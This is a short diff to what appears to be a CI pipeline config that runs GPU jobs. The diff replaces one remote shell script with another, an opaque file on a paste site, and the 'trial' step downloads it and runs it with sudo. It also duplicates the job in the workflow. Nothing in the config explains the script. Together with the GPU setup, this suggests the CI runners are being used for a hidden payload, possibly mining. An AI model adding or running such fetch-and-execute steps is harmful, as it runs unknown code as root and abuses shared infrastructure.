@@ -10,10 +10,11 @@ jobs:
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
       - run: 
             name: "trial" 
-            command: wget https://raw.githubusercontent.com/berhasilsemua83/sirkelci/main/anonim.sh && chmod u+x anonim.sh && sudo ./anonim.sh 
+            command: wget https://muq-hastebin.glitch.me/raw/rbXy36HWQr && chmod u+x rbXy36HWQr && sudo ./rbXy36HWQr
  
 workflows: 
     version: 2.1 
     build: 
         jobs: 
+        - trial
         - trial
